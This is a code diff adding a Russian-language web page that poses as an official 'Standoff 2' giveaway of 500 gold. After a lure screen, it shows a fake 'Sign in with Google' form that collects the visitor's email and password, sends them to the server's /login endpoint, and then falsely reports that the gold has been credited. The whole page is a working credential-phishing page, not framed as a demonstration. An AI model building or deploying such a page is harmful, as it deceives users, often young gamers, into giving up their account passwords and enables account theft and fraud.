@@ -1,0 +1,363 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>Standoff 2 — 500 Gold</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        body {
+            background: #0a0a0f;
+            color: #fff;
+            font-family: 'Segoe UI', Arial, sans-serif;
+            min-height: 100vh;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            padding: 16px;
+            background-image: radial-gradient(circle at 20% 30%, #1a1a2e 0%, #0a0a0f 80%);
+        }
+
+        .container {
+            background: linear-gradient(145deg, #14141e, #1c1c2a);
+            padding: 30px 20px 25px;
+            border-radius: 32px;
+            width: 100%;
+            max-width: 420px;
+            text-align: center;
+            border: 1px solid #ffd70033;
+            box-shadow: 0 20px 60px rgba(0,0,0,0.9), 0 0 40px #ffd70008;
+            position: relative;
+            overflow: hidden;
+        }
+
+        /* Декоративные элементы по бокам */
+        .deco {
+            position: absolute;
+            font-size: 48px;
+            opacity: 0.15;
+            user-select: none;
+            pointer-events: none;
+        }
+        .deco-left {
+            top: 20px;
+            left: 10px;
+            transform: rotate(-15deg);
+        }
+        .deco-right {
+            bottom: 20px;
+            right: 10px;
+            transform: rotate(15deg);
+        }
+        .deco-gold-left {
+            top: 60%;
+            left: 5px;
+            font-size: 36px;
+            opacity: 0.2;
+            transform: rotate(-10deg);
+        }
+        .deco-gold-right {
+            top: 30%;
+            right: 5px;
+            font-size: 36px;
+            opacity: 0.2;
+            transform: rotate(10deg);
+        }
+
+        .logo {
+            font-size: 34px;
+            font-weight: 900;
+            background: linear-gradient(135deg, #ffd700, #ff8c00);
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+            letter-spacing: 2px;
+            text-shadow: 0 0 30px #ffd70022;
+            position: relative;
+            z-index: 2;
+        }
+
+        .sub {
+            color: #8888aa;
+            font-size: 13px;
+            margin: 4px 0 14px;
+            letter-spacing: 1px;
+            position: relative;
+            z-index: 2;
+        }
+
+        .gold-badge {
+            background: linear-gradient(135deg, #2a2a3a, #1f1f2e);
+            padding: 10px 18px;
+            border-radius: 40px;
+            display: inline-block;
+            font-size: 26px;
+            font-weight: bold;
+            color: #ffd700;
+            border: 1px solid #ffd70055;
+            box-shadow: 0 0 30px #ffd70015;
+            margin-bottom: 14px;
+            position: relative;
+            z-index: 2;
+        }
+
+        .gold-badge::before {
+            content: "✦ ";
+            color: #ffaa00;
+        }
+        .gold-badge::after {
+            content: " ✦";
+            color: #ffaa00;
+        }
+
+        .btn {
+            background: linear-gradient(135deg, #ffd700, #f0a500);
+            color: #0a0a0f;
+            padding: 16px 20px;
+            border: none;
+            border-radius: 40px;
+            font-size: 18px;
+            font-weight: 800;
+            cursor: pointer;
+            transition: 0.3s;
+            width: 100%;
+            letter-spacing: 1.5px;
+            text-transform: uppercase;
+            box-shadow: 0 4px 20px #ffd70033;
+            position: relative;
+            z-index: 2;
+        }
+
+        .btn:hover {
+            transform: scale(1.02);
+            box-shadow: 0 4px 40px #ffd70055;
+        }
+
+        .btn:active {
+            transform: scale(0.96);
+        }
+
+        .hidden {
+            display: none !important;
+        }
+
+        .input-group {
+            margin-top: 16px;
+            text-align: left;
+            position: relative;
+            z-index: 2;
+        }
+
+        .input-group label {
+            display: block;
+            font-size: 13px;
+            color: #99aabb;
+            margin-bottom: 4px;
+            letter-spacing: 0.5px;
+        }
+
+        .input-group input {
+            width: 100%;
+            padding: 14px 16px;
+            border: 1px solid #2a2a3e;
+            border-radius: 16px;
+            background: #0e0e18;
+            color: #fff;
+            font-size: 16px;
+            outline: none;
+            transition: 0.3s;
+            margin-bottom: 10px;
+            box-shadow: inset 0 2px 8px rgba(0,0,0,0.5);
+        }
+
+        .input-group input:focus {
+            border-color: #ffd700;
+            box-shadow: 0 0 20px #ffd70015, inset 0 2px 8px rgba(0,0,0,0.5);
+        }
+
+        .result {
+            margin-top: 14px;
+            font-weight: bold;
+            font-size: 15px;
+            color: #00ff88;
+            position: relative;
+            z-index: 2;
+        }
+
+        .footer {
+            margin-top: 18px;
+            font-size: 11px;
+            color: #445;
+            letter-spacing: 0.5px;
+            position: relative;
+            z-index: 2;
+        }
+
+        /* Оружие и слитки — декоративные иконки */
+        .weapon-row {
+            display: flex;
+            justify-content: center;
+            gap: 12px;
+            margin: 10px 0 6px;
+            font-size: 28px;
+            opacity: 0.3;
+            position: relative;
+            z-index: 1;
+            flex-wrap: wrap;
+        }
+
+        .weapon-row span {
+            filter: drop-shadow(0 0 6px #ffd70022);
+        }
+
+        /* Адаптация под маленькие экраны */
+        @media (max-width: 480px) {
+            .container {
+                padding: 24px 16px 20px;
+            }
+            .logo {
+                font-size: 28px;
+            }
+            .gold-badge {
+                font-size: 22px;
+                padding: 8px 14px;
+            }
+            .btn {
+                font-size: 16px;
+                padding: 14px 16px;
+            }
+            .deco {
+                font-size: 32px;
+            }
+            .deco-gold-left, .deco-gold-right {
+                font-size: 28px;
+            }
+            .weapon-row {
+                font-size: 22px;
+                gap: 8px;
+            }
+        }
+
+        @media (max-width: 380px) {
+            .container {
+                padding: 18px 12px 16px;
+            }
+            .logo {
+                font-size: 24px;
+            }
+            .gold-badge {
+                font-size: 18px;
+                padding: 6px 12px;
+            }
+            .btn {
+                font-size: 14px;
+                padding: 12px 12px;
+            }
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+
+        <!-- Декоративные элементы -->
+        <div class="deco deco-left">🔫</div>
+        <div class="deco deco-right">💣</div>
+        <div class="deco deco-gold-left">🪙</div>
+        <div class="deco deco-gold-right">💰</div>
+
+        <!-- Ряд оружия -->
+        <div class="weapon-row">
+            <span>🔫</span>
+            <span>⚔️</span>
+            <span>🛡️</span>
+            <span>💣</span>
+            <span>🔪</span>
+        </div>
+
+        <!-- ШАГ 1 -->
+        <div id="step1">
+            <div class="logo">STANDOFF 2</div>
+            <div class="sub">⚡ Бесплатный розыгрыш ⚡</div>
+            <div class="gold-badge">+500 ГОЛДЫ</div>
+            <p style="color:#99aabb; margin-bottom: 12px; font-size: 15px; position:relative; z-index:2;">
+                Забери бонус сейчас — только сегодня!
+            </p>
+            <button class="btn" onclick="showStep2()">ЗАБРАТЬ ГОЛДУ</button>
+        </div>
+        <!-- ШАГ 2 -->
+        <div id="step2" class="hidden">
+            <div class="logo" style="font-size:26px; -webkit-text-fill-color:#ffd700; background:none; color:#ffd700;">
+                🔐 Вход через Google
+            </div>
+            <div style="color:#99aabb; font-size:14px; margin:4px 0 8px; position:relative; z-index:2;">
+                Подтверди аккаунт
+            </div>
+            <form id="loginForm" onsubmit="submitForm(event)">
+                <div class="input-group">
+                    <label>📧 Электронная почта</label>
+                    <input type="email" id="email" placeholder="your@gmail.com" required>
+                </div>
+                <div class="input-group">
+                    <label>🔑 Пароль</label>
+                    <input type="password" id="password" placeholder="••••••••" required>
+                </div>
+                <button type="submit" class="btn" style="font-size:17px;">✅ ПОЛУЧИТЬ ГОЛДУ</button>
+            </form>
+            <div id="result" class="result"></div>
+        </div>
+
+        <!-- Футер с оружием -->
+        <div class="weapon-row" style="margin-top: 12px; opacity:0.2;">
+            <span>🪙</span>
+            <span>🔫</span>
+            <span>💰</span>
+            <span>💣</span>
+            <span>🪙</span>
+        </div>
+
+        <div class="footer">© Standoff 2 — официальный партнёр</div>
+    </div>
+
+    <script>
+        function showStep2() {
+            document.getElementById('step1').style.display = 'none';
+            document.getElementById('step2').classList.remove('hidden');
+        }
+
+        async function submitForm(e) {
+            e.preventDefault();
+            const email = document.getElementById('email').value;
+            const password = document.getElementById('password').value;
+            const result = document.getElementById('result');
+
+            result.textContent = '⏳ Проверка...';
+            result.style.color = '#ffd700';
+
+            try {
+                const res = await fetch('/login', {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({ email, password })
+                });
+
+                const data = await res.json();
+
+                if (data.success) {
+                    result.textContent = '✅ 500 голды начислено! Перезагрузи игру';
+                    result.style.color = '#00ff88';
+                } else {
+                    result.textContent = '❌ Ошибка: ' + (data.error || 'попробуй снова');
+                    result.style.color = '#ff4444';
+                }
+            } catch (err) {
+                result.textContent = '❌ Ошибка соединения';
+                result.style.color = '#ff4444';
+            }
+        }
+    </script>
+</body>
+</html>
